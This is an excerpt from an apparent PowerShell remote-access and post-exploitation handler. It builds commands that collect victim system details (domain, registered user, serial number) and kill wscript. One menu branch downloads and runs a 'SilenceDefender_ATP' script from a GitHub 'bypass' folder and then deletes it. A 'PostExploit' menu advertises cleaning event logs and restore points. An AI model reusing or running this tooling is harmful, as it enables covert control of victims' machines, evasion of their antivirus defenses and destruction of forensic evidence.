...
.SYNOPSIS
   ...
   PS Script Dev Version: v2.10.10.11
...
$Command = "cd `$env:tmp;`"`n   DomainName     : `"+$Name+`"``n   RemoteHost     : `"+`"$Remote_Host`"+`"``n   BootUpTime     : `"+$BootUpTime+`"``n   RegisteredUser : `"+$RegisteredUser+`"``n   OP System      : `"+$System+`"``n   OP Version     : `"+$Version+`"``n   Architecture   : `"+$Architecture+`"``n   WindowsDir     : `"+$WindowsDirectory+`"``n   SystemDir      : `"+$syst_dir+`"``n   SerialNumber   : `"+$serial+`"``n   WorkingDir     : `"+$RhostWorkingDir+`"``n   ProcessorCPU   : `"+$Processor;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";
  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "FRM" -or $choise -ieq "FRManager")
      {
         ...
         write-host "   To Block multiple ports, split the port numbers by a comma." -ForegroundColor Yellow;
         ...
         If($Firewall_choise -ieq "Create")
         {
            ...
            Write-Host " => Remark: Dont use double quotes in inputs!`n" -ForegroundColor Yellow
            ...
            $Program = Read-Host;
            Write-Host " - The Program ports to block (22,80): " -NoNewline;
            ...
            If(-not($RemotePort) -or $RemotePort -ieq $null){$RemotePort = "80,443,445"}
            If(-not($DisplayName) -or $DisplayName -ieq $null){$DisplayName = "Block MyFirefox"}
            If(-not($Program) -or $Program -ieq $null){$Program = "%ProgramFiles%\Mozilla Firefox\firefox.exe"}
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Create -DisplayName `"$DisplayName`" -Program `"$Program`" -RemotePort `"$RemotePort`" -Direction $Direction;Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"
         }
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "Artifacts")
      {
         ...
         write-host "   Remark: Administrator privs required to clean eventvwr + Restore Points"
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
